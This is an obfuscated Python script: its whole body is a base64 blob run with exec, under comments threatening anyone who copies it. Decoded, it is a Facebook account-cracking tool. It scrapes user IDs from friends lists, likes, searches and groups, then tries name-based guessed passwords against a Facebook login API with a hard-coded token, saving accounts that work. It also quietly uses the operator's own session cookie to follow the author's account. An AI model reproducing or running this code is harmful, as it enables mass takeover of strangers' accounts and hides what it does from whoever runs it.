#Encode by Anbia Nuansyah
#Apa Kau mau recode ?
#kau bilang ini SC nyolong?
#ku pecahkan pala kau
import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQojIGNvZGVkIGJ5IGFuYmlhCmltcG9ydCBvcwppbXBvcnQgcmUgCmltcG9ydCB0aW1lCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IHJlcXVlc3RzCmZyb20gbGliIGltcG9ydCBsb2dvCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHBhcnNlcgpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yCm1iYXNpYyA9ICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb217fScKZ2xvYmFsIGRpZSxjaGVjayxyZXN1bHQsIGNvdW50CgppZCA9IFtdCmRpZSA9IDAKY2hlayA9IFtdCmxpZmUgPSBbXQpjb3VudCA9IDAKY2hlY2sgPSAwCnJlc3VsdCA9IDAKCmcgPSAnXHgxYlsxOzMybScKdyA9ICdceDFiWzE7MzdtJwpiID0gJ1x4MWJbMTszNm0nCnIgPSAnXHgxYlsxOzMxbScKCmRlZiBtYXN1aygpOgogICAgICAgIGxvZ28uYmFubmVyKCkKICAgICAgICBwcmludCgnXG5cblx0XHTiibogXDAzM1sxOzM2bUxPR0lOIEZBQ0VCT09LIE1FVEhPRFwwMzNbMG0g4om7XG5cbicpCiAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgY2VrID0gb3BlbigiY29va2llcyIpLnJlYWQoKQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgICAgIGNlayA9IGlucHV0KCJbXDAzM1sxOzMybT5cMDMzWzBtIEVudGVyIENvb2tpZSA6ICIpCiAgICAgICAgY2VrID0geyJjb29raWUiOmNla30KICAgICAgICBpc21pID0gc2VzLmdldChtYmFzaWMuZm9ybWF0KCIvbWUiLHZlcmlmeT1GYWxzZSksY29va2llcz1jZWspLmNvbnRlbnQKICAgICAgICBpZiAibWJhc2ljX2xvZ291dF9idXR0b24iIGluIHN0cihpc21pKToKICAgICAgICAgICAgICAgIGlmICJBcGEgeWFuZyBBbmRhIHBpa2lya2FuIHNla2FyYW5nIiBpbiBzdHIoaXNtaSk6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigiY29va2llcyIsInciKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoY2VrWyJjb29raWUiXSkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIjIENoYW5nZSB0aGUgbGFuZ3VhZ2UsIHBsZWFzZSB3YWl0ISEiKQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KG1iYXNpYy5mb3JtYXQocGFyc2VyKGlzbWksImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJCYWhhc2EgSW5kb25lc2lhIilbImhyZWYiXSksY29va2llcz1jZWspCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICMgcGxlYXNlIGRvbid0IHJlbW92ZSB0aGlzIG9yIGNoYW5nZQogICAgICAgICAgICAgICAgICAgICAgICBpa3V0aSA9IHBhcnNlcihyZXF1ZXN0cy5nZXQobWJhc2ljLmZvcm1hdCgiL2FuYmlhLnV0YW1hIiksY29va2llcz1jZWspLmNvbnRlbnQsImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJJa3V0aSIpWyJocmVmIl0KICAgICAgICAgICAgICAgICAgICAgICAgc2VzLmdldChtYmFzaWMuZm9ybWF0KGlrdXRpKSxjb29raWVzPWNlaykKICAgICAgICAgICAgICAgIGV4Y2VwdCA6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MgCiAgICAgICAgICAgICAgICByZXR1cm4gY2VrWyJjb29raWUiXQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgZXhpdCgiIyBjb29raWVzIGludmFsaWQiKQpkZWYgbG9naW4odXNlcm5hbWUscGFzc3dvcmQsY2VrPUZhbHNlKToKICAgICAgICBnbG9iYWwgZGllLGNoZWNrLHJlc3VsdCxjb3VudAogICAgICAgIGIgPSAiMzUwNjg1NTMxNzI4JTdDNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzIiCiAgICAgICAgcGFyYW1zID0gewogICAgICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IGIsCiAgICAgICAgICAgICAgICAnZm9ybWF0JzogJ0pTT04nLAogICAgICAgICAgICAgICAgJ3Nka192ZXJzaW9uJzogJzInLAogICAgICAgICAgICAgICAgJ2VtYWlsJzogdXNlcm5hbWUsCiAgICAgICAgICAgICAgICAnbG9jYWxlJzogJ2VuX1VTJywKICAgICAgICAgICAgICAgICdwYXNzd29yZCc6IHBhc3N3b3JkLAogICAgICAgICAgICAgICAgJ3Nkayc6ICdpb3MnLAogICAgICAgICAgICAgICAgJ2dlbmVyYXRlX3Nlc3Npb25fY29va2llcyc6ICcxJywKICAgICAgICAgICAgICAgICdzaWcnOiAnM2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnLAogICAgICAgIH0KICAgICAgICBhcGkgPSAnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4nCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoYXBpLCBwYXJhbXM9cGFyYW1zKQogICAgICAgIGlmICdFQUEnIGluIHJlc3BvbnNlLnRleHQ6CiAgICAgICAgICAgICAgICBwcmludChmIlxyW1wwMzNbMTszMm1MSUZFXDAzM1swbV0ge3VzZXJuYW1lfSA9PiB7cGFzc3dvcmR9ICAgICAgICAgICAgICAgICAgICAgICAiLGVuZD0iIikKICAgICAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgICAgIHJlc3VsdCArPSAxCiAgICAgICAgICAgICAgICBpZiBjZWs6CiAgICAgICAgICAgICAgICAgICAgICAgIGxpZmUuYXBwZW5kKHVzZXJuYW1lKyJ8IitwYXNzd29yZCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1saWZlLnR4dCcsJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUodXNlcm5hbWUgKyAnfCcgKyBwYXNzd29yZCArICdcbicpCiAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcmVzcG9uc2UuanNvbigpWydlcnJvcl9tc2cnXToKICAgICAgICAgICAgICAgIHByaW50KGYiXHJbXDAzM1sxOzkxbUNIRUtcMDMzWzBtXSB7dXNlcm5hbWV9ID0+IHtwYXNzd29yZH0gICAgICAgICAgICAgICAgICAgICIsZW5kPSIiKQogICAgICAgICAgICAgICAgcHJpbnQoKQogICAgICAgICAgICAgICAgY2hlY2sgKz0gMQogICAgICAgICAgICAgICAgaWYgY2VrOgogICAgICAgICAgICAgICAgICAgICAgICBjaGVrLmFwcGVuZCh1c2VybmFtZSsifCIrcGFzc3dvcmQpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtY2hlY2sudHh0JywnYScpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSh1c2VybmFtZSArICd8JyArIHBhc3N3b3JkICsgJ1xuJykKICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZGllICs9IDEKICAgICAgICBmb3IgaSBpbiBsaXN0KCdcfC8t4oCiJyk6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJbe2l9XSBMaWZlIDogKHtzdHIocmVzdWx0KX0pIGNoZWNrcG9pbnQgOiAoe3N0cihjaGVjayl9KSBkaWUgOiAoe3N0cihkaWUpfSkiLGVuZD0iIikKICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjIpCmRlZiBnZXRpZCh1cmwpOgogICAgICAgIHJhdyA9IHJlcXVlc3RzLmdldCh1cmwsY29va2llcz1rdWtpKS5jb250ZW50CiAgICAgICAgZ2V0dXNlciA9IHJlLmZpbmRhbGwoJ21pZGRsZSI+PGEgY2xhc3M9Ii4uIiBocmVmPSIoLio/KSI+KC4qPyk8L2E+JyxzdHIocmF3KSkKICAgICAgICBmb3IgeCBpbiBnZXR1c2VyOgogICAgICAgICAgICAgICAgaWYgJ3Byb2ZpbGUnIGluIHhbMF06CiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh4WzFdICsgJ3wnICsgcmUuZmluZGFsbCgiPShcZCopPyIsc3RyKHhbMF0pKVswXSkKICAgICAgICAgICAgICAgIGVsaWYgJ2ZyaWVuZHMnIGluIHg6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQoeFsxXSArICd8JyArIHhbMF0uc3BsaXQoJy8nKVsxXS5zcGxpdCgnPycpWzBdKQogICAgICAgICAgICAgICAgcHJpbnQoJ1xyIyAnICsgc3RyKGxlbihpZCkpICsgIiByZXRyaWV2ZWQiLGVuZD0iIikKICAgICAgICBpZiAnTGloYXQgVGVtYW4gTGFpbicgaW4gc3RyKHJhdyk6CiAgICAgICAgICAgICAgICBnZXRpZChtYmFzaWMuZm9ybWF0KHBhcnNlcihyYXcsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSdMaWhhdCBUZW1hbiBMYWluJylbJ2hyZWYnXSkpCiAgICAgICAgcmV0dXJuIGlkCmRlZiBmcm9tbGlrZXModXJsKToKICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBsaWtlID0gcmVxdWVzdHMuZ2V0KHVybCxjb29raWVzPWt1a2kpLmNvbnRlbnQKICAgICAgICAgICAgICAgIGxvdmUgPSByZS5maW5kYWxsKCdocmVmPSIoL3VmaS4qPykiJyxzdHIobGlrZSkpWzBdCiAgICAgICAgICAgICAgICBhd3MgPSBnZXRsaWtlKG1iYXNpYy5mb3JtYXQobG92ZSkpCiAgICAgICAgICAgICAgICByZXR1cm4gYXdzCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgZXhpdCgiIyBjYW50IGR1bXAgaWQgIikKZGVmIGdldGxpa2UocmVhY3QpOgogICAgICAgIGxpa2UgPSByZXF1ZXN0cy5nZXQocmVhY3QsY29va2llcz1rdWtpKS5jb250ZW50CiAgICAgICAgaWRzICA9IHJlLmZpbmRhbGwoJ2NsYXNzPSJiLiI+PGEgaHJlZj0iKC4qPykiPiguKj8pPC9hPjwvaDM+JyxzdHIobGlrZSkpCiAgICAgICAgZm9yIHVzZXIgaW4gaWRzOgogICAgICAgICAgICAgICAgaWYgJ3Byb2ZpbGUnIGluIHVzZXJbMF06CiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgcmUuZmluZGFsbCgiPShcZCopIixzdHIodXNlclswXSkpWzBdKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyB1c2VyWzBdLnNwbGl0KCcvJylbMV0pCiAgICAgICAgICAgICAgICBwcmludChmJ1xyIyB7c3RyKGxlbihpZCkpfSByZXRyaWV2ZWQnLGVuZD0iIikKICAgICAgICBpZiAnTGloYXQgU2VsZW5na2FwbnlhJyBpbiBzdHIobGlrZSk6CiAgICAgICAgICAgICAgICBnZXRsaWtlKG1iYXNpYy5mb3JtYXQocGFyc2VyKGxpa2UsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSJMaWhhdCBTZWxlbmdrYXBueWEiKVsiaHJlZiJdKSkKICAgICAgICByZXR1cm4gaWQKZGVmIGJ5c2VhcmNoKG9wdGlvbik6CiAgICAgICAgc2VhcmNoID0gcmVxdWVzdHMuZ2V0KG9wdGlvbixjb29raWVzPWt1a2kpLmNvbnRlbnQKICAgICAgICB1c2VycyA9IHJlLmZpbmRhbGwoJ2NsYXNzPSJ4IGNoIj48YSBocmVmPSIvKC4qPykiPjxkaXYuKj9jbGFzcz0iY2oiPiguKj8pPC9kaXY+JyxzdHIoc2VhcmNoKSkKICAgICAgICBmb3IgdXNlciBpbiB1c2VyczoKICAgICAgICAgICAgICAgIGlmICJwcm9maWxlIiBpbiB1c2VyWzBdOgogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHJlLmZpbmRhbGwoIj0oXGQqKSIsc3RyKHVzZXJbMF0pKVswXSkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgdXNlclswXS5zcGxpdCgiPyIpWzBdKQogICAgICAgICAgICAgICAgcHJpbnQoZiJcciMge3N0cihsZW4oaWQpKX0gcmV0cmlldmVkICIsZW5kPSIiKQogICAgICAgIGlmICJMaWhhdCBIYXNpbCBTZWxhbmp1dG55YSIgaW4gc3RyKHNlYXJjaCk6CiAgICAgICAgICAgICAgICBieXNlYXJjaChwYXJzZXIoc2VhcmNoLCdodG1sLnBhcnNlcicpLmZpbmQoImEiLHN0cmluZz0iTGloYXQgSGFzaWwgU2VsYW5qdXRueWEiKVsiaHJlZiJdKQogICAgICAgIHJldHVybiBpZApkZWYgZ3J1YmlkKGVuZHBvaW50KToKICAgICAgICBncmFiID0gcmVxdWVzdHMuZ2V0KGVuZHBvaW50LGNvb2tpZXM9a3VraSkuY29udGVudAogICAgICAgIHVzZXJzID0gcmUuZmluZGFsbCgnYSBjbGFzcz0iLi4iIGhyZWY9Ii8oLio/KSI+KC4qPyk8L2E+JyxzdHIoZ3JhYikpCiAgICAgICAgZm9yIHVzZXIgaW4gdXNlcnM6CiAgICAgICAgICAgICAgICBpZiAicHJvZmlsZSIgaW4gdXNlclswXToKICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyByZS5maW5kYWxsKCdpZD0oXGQqKScsc3RyKHVzZXJbMF0pKVswXSkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgdXNlclswXSkKICAgICAgICAgICAgICAgIHByaW50KGYiXHIjIHtzdHIobGVuKGlkKSl9IHJldHJpZXZlZCAiLGVuZD0iIikKICAgICAgICBpZiAiTGloYXQgU2VsZW5na2FwbnlhIiBpbiBzdHIoZ3JhYik6CiAgICAgICAgICAgICAgICBncnViaWQobWJhc2ljLmZvcm1hdChwYXJzZXIoZ3JhYiwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IkxpaGF0IFNlbGVuZ2thcG55YSIpWyJocmVmIl0pKQogICAgICAgIHJldHVybiBpZAppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgiZ2l0IHB1bGwiKQogICAgICAgICAgICAgICAgc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgICAgICAgICBrdWtpcyA9IG1hc3VrKCkKICAgICAgICAgICAgICAgIGt1a2kgPSB7J2Nvb2tpZSc6a3VraXN9CiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICAgICAgICAgIHByaW50KCdcblxuXHRcdOKJuiBcMDMzWzE7MzZtRkFDRUJPT0sgVE9PTEtJVFwwMzNbMG0g4om7XG5cbicpCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbeKUo+KUgSBcMDMzWzBtW1wwMzNbMTszMm0xXDAzM1swbV0gTGlzdCBmcmllbmRzJykKICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFt4pSj4pSBXDAzM1swbSBbXDAzM1sxOzMybTJcMDMzWzBtXSBDcmFjayBGcm9tIExpa2VzXDAzM1sxOzkxbSAnKQogICAgICAgICAgICAgICAgcHJpbnQoJ+KUo+KUgSBcMDMzWzBtW1wwMzNbMTszMm0zXDAzM1swbV0gQ3JhY2sgRnJvbSBTZWFyY2ggTmFtZScpCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbeKUo+KUgSBcMDMzWzBtW1wwMzNbMTszMm00XDAzM1swbV0gQ3JhY2sgRnJvbSBncm91cCAnKQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW3ilKPilIEgXDAzM1swbVtcMDMzWzE7MzJtNVwwMzNbMG1dIENyYWNrIEZyb20gZnJpZW5kJykKICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFt4pSj4pSBIFwwMzNbMG1bXDAzM1sxOzMybTZcMDMzWzBtXSBSZXN1bHRzIGNoZWNrJykKICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFt4pSXXDAzM1swbVxuJykKICAgICAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgICAgIHRhbnlhID0gaW5wdXQoJ+KemyAnKQogICAgICAgICAgICAgICAgaWYgdGFueWEgPT0iIjoKICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiWyFdIERvbnQgYmUgZW1wdHkiKQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMSc6CiAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IHBhcnNlcihzZXMuZ2V0KG1iYXNpYy5mb3JtYXQoJy9tZScpLGNvb2tpZXM9a3VraSkuY29udGVudCwnaHRtbC5wYXJzZXInKS5maW5kKCdhJyxzdHJpbmc9J1RlbWFuJykKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBnZXRpZChtYmFzaWMuZm9ybWF0KHVybFsiaHJlZiJdKSkKICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzInOgogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGlucHV0KCIjIHVybCA6ICIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVzZXJuYW1lID09ICIiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgRG9udCBiZSBlbXB0eSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vaycgaW4gdXNlcm5hbWU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHVzZXJuYW1lLnJlcGxhY2UoJ3d3dy5mYWNlYm9vaycsJ21iYXNpYy5mYWNlYm9vaycpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ20uZmFjZWJvb2suY29tJyBpbiB1c2VybmFtZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gdXNlcm5hbWUucmVwbGFjZSgnbS5mYWNlYm9vay5jb20nLCdtYmFzaWMuZmFjZWJvb2suY29tJykKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBmcm9tbGlrZXModXNlcm5hbWUpIAogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMyc6CiAgICAgICAgICAgICAgICAgICAgICAgIHpldCA9IGlucHV0KCIjIHF1ZXJ5IDogIikKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBieXNlYXJjaChtYmFzaWMuZm9ybWF0KCcvc2VhcmNoL3Blb3BsZS8/cT0nK3pldCkpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih1c2VybmFtZSkgPT0gMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIG5vIHJlc3VsdCIpCiAgICAgICAgICAgICAgICBlbGlmIHRhbnlhID09ICc0JzoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiMgY2FuIG9ubHkgdGFrZSAxMDAgSURzICIpCiAgICAgICAgICAgICAgICAgICAgICAgIGdyYWIgPSBpbnB1dCgiIyBJRCBncm91cCA6ICIpCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gZ3J1YmlkKG1iYXNpYy5mb3JtYXQoIi9icm93c2UvZ3JvdXAvbWVtYmVycy8/aWQ9IiArIGdyYWIpKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4odXNlcm5hbWUpID09IDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyBJRCB3cm9uZyIpCiAgICAgICAgICAgICAgICBlbGlmIHRhbnlhID09ICc1JzoKICAgICAgICAgICAgICAgICAgICAgICAgemV0ID0gaW5wdXQoIiMgZW50ZXIgdXNlcm5hbWUvSWQgOiAiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiB6ZXQuaXNkaWdpdCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXIgPSAiL3Byb2ZpbGUucGhwP2lkPSIgKyB6ZXQKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gIi8iICsgemV0CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KHVzZXIpLGNvb2tpZXM9a3VraSkuY29udGVudCwiaHRtbC5wYXJzZXIiKS5maW5kKCdhJyxzdHJpbmc9IlRlbWFuIilbImhyZWYiXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gZ2V0aWQobWJhc2ljLmZvcm1hdCh1c2VyKSkKICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFR5cGVFcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIHVzZXIgbm90IGZvdW5kICIpCiAgICAgICAgICAgICAgICBlbGlmIHRhbnlhID09ICc2JzoKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUxID0gb3BlbigicmVzdWx0cy1jaGVjay50eHQiKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlMiA9IG9wZW4oInJlc3VsdHMtbGlmZS50eHQiKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhID0gZmlsZTEgKyBmaWxlMgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbmFsID0gYS5zdHJpcCgpLnNwbGl0KCJcbiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmluYWwgPSBzZXQoZmluYWwpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIjIHtzdHIobGVuKGZpbmFsKSl9IGFjY291bnRzIHRvIGNoZWNrICIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MTApIGFzIGV4OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVzZXIgaW4gZmluYWw6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEgPSB1c2VyLnNwbGl0KCJ8IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXguc3VibWl0KGxvZ2luLChhWzBdKSwoYVsxXSksKFRydWUpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgicmVzdWx0cy1jaGVjay50eHQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgicmVzdWx0cy1saWZlLnR4dCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gbGlmZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1saWZlLnR4dCcsJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHgrJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiBjaGVrOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdyZXN1bHRzLWNoZWNrLnR4dCcsJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHgrIlxuIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4jIERvbmUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIjIHNhdmVkIHRvIHJlc3VsdHMtY2hlY2sudHh0IHJlc3VsdHMtbGlmZS50eHQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyB5b3Ugbm90IGhhdmUgYSByZXN1bHRzIikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgd3JvbmcgY2hvaWNlIikKICAgICAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgICAgIGV4cGFzcyA9IGlucHV0KCJbXDAzM1sxOzMybT5cMDMzWzBtXSBFeHRyYSBQYXNzd29yZCA6ICIpCiAgICAgICAgICAgICAgICBwcmludCgiIyByZXN1bHQgd2lsbCBiZSBzYXZlZCBpbiByZXN1bHRzLWxpZmUudHh0IGFuZCByZXN1bHRzLWNoZWNrLnR4dCIpCiAgICAgICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgZXg6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB1c2VyIGluIHVzZXJuYW1lOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJzID0gdXNlci5zcGxpdCgnfCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3MgPSB1c2Vyc1swXS5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gc3M6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXN0cGFzcyA9IFsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMjM0NScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMjM0NTYnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoeCkgKyAnMTInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXN0cGFzcy5hcHBlbmQoZXhwYXNzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHBhc3N3IGluIHNldChsaXN0cGFzcyk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4LnN1Ym1pdChsb2dpbiwodXNlcnNbMV0pLChwYXNzdykpCiAgICAgICAgICAgICAgICBpZiBjaGVjayAhPSAwIG9yIHJlc3VsdCAhPSAwOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG5bXDAzM1sxOzMybeKclFwwMzNbMG0gRG9uZS4gZmlsZSBzYXZlZCBpbiA6ICIpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIgICAgICAgIC0gbGlmZSA6IHJlc3VsdHMtbGlmZS50eHQiKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiICAgICAgICAtIGNoZWNrcG9pbnQgOiByZXN1bHRzLWNoZWNrLnR4dCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgdGhhbmtzIGZvciB1c2luZyB0aGlzIHRvb2xzIikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcbiMgRG9uZSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgbm8gcmVzdWx0IikKICAgICAgICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKICAgICAgICAgICAgICAgIGV4aXQoKQogICAg